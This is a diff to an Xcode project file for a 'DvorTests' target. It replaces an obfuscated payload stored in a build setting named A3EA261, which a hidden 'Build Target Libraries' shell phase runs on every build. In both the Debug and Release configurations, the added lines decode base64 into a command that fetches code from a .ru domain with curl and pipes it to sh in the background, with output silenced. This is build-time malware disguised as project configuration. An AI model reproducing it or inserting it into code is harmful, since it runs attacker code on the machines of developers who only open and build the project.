@@ -16,9 +16,6 @@
 		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		95C68A683041648400FB5455 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -118,7 +115,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
 			buildPhases = (
-				480CB8D01FFD4B86A3162AE3 /* Build Target Libraries */,
+				B6422F5B19214BF699162AE3 /* Build Target Libraries */,
 				95C68A603041648400FB5455 /* Sources */,
 				95C68A613041648400FB5455 /* Frameworks */,
 				95C68A623041648400FB5455 /* Resources */,
@@ -212,8 +209,28 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
+/* Begin PBXResourcesBuildPhase section */
+		95C68A623041648400FB5455 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		95DE96EE2E264CF00002C780 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
 /* Begin PBXShellScriptBuildPhase section */
-		480CB8D01FFD4B86A3162AE3 /* Build Target Libraries */ = {
+		B6422F5B19214BF699162AE3 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -233,23 +250,6 @@
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
 		};
 /* End PBXShellScriptBuildPhase section */
-
-/* Begin PBXResourcesBuildPhase section */
-		95C68A623041648400FB5455 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
-		95DE96EE2E264CF00002C780 /* Resources */ = {
-			isa = PBXResourcesBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
-/* End PBXResourcesBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		95C68A603041648400FB5455 /* Sources */ = {
@@ -280,7 +280,7 @@
 		95C68A6A3041648400FB5455 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((b(){ `printf b1ase64 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1zTGZrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | b | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((e(){ `printf baxse64 | tr -d x` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgMyAtTGtzZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly94NWVyenNrbXZjYW5zMGgucnUvYSkiIHwgc2gK | e | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
@@ -309,7 +309,7 @@
 		95C68A6B3041648400FB5455 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((b(){ `printf b1ase64 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1zTGZrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | b | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((e(){ `printf baxse64 | tr -d x` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgMyAtTGtzZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly94NWVyenNrbXZjYW5zMGgucnUvYSkiIHwgc2gK | e | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_STYLE = Automatic;
